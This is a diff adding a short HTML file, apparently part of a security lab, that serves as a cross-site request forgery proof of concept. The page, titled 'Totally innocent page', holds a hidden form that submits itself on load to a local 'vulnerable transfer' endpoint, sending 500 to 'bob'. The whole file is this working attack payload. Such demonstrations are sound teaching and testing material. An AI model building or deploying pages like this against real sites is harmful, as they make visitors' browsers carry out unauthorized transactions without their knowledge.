@@ -1,0 +1,10 @@
+<!doctype html>
+<html><body>
+<h3>Totally innocent page</h3>
+<p>This page auto-submits a hidden form to the vulnerable transfer endpoint on page load.</p>
+<form id="evil" action="http://127.0.0.1:5000/csrf/vulnerable/transfer" method="POST">
+  <input type="hidden" name="amount" value="500">
+  <input type="hidden" name="to" value="bob">
+</form>
+<script>document.getElementById('evil').submit();</script>
+</body></html>
